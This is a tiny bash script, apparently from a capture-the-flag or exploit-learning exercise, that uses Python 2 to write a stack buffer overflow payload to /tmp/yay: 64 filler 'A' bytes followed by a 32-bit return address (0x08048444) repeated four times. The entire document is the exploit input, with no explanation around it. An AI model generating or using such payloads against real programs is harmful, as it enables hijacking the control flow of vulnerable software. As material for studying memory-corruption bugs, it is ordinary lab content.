#!/bin/bash
python -c 'print "A" * 64 + "\x44\x84\x04\x08" * 4' > /tmp/yay
